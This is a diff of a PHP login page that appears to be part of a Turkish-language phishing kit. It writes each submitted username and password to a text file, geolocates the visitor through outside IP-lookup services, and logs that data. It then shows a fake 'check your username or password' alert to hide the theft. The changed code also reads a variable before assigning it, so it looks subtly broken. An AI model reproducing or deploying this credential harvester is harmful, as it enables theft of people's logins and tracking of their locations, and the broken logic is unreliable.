@@ -1,38 +1,12 @@
 <?php  
 
 if (isset($_POST['login']) && isset($_POST['password'])) {
-
-$ac = fopen("kayit.txt","a+");
-$username = $_POST['login'];
-$password = $_POST['password'];
-$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
-fwrite($ac,$userlar);
-fclose($ac);
-echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
-}
-else{
+$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
+$ip =$data["query"];
 date_default_timezone_set('Europe/Istanbul');
-
-function GetIP(){
- if(getenv("HTTP_CLIENT_IP")) {
- $ip = getenv("HTTP_CLIENT_IP");
- } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
- $ip = getenv("HTTP_X_FORWARDED_FOR");
- if (strstr($ip, ',')) {
- $tmp = explode (',', $ip);
- $ip = trim($tmp[0]);
- }
- } else {
- $ip = getenv("REMOTE_ADDR");
- }
- return $ip;
-}
-
-$ip = $_SERVER["REMOTE_ADDR"];
 
 
 $tarih =" Tarih : ".date('d/m/Y  H:i');
-
 $Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
 $adress = $Geo_Plugin_XML->geoplugin_request; 
 $ulke = $Geo_Plugin_XML->geoplugin_countryName;
@@ -64,11 +38,15 @@ $ac = fopen("kayit.txt","a+");
 $userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
 fwrite($ac,$userlar);
 fclose($ac);
+sleep(2);
 
-
-
-
-
+$ac = fopen("kayit.txt","a+");
+$username = $_POST['login'];
+$password = $_POST['password'];
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+fwrite($ac,$userlar);
+fclose($ac);
+echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
 }
  ?>
 <!DOCTYPE html>
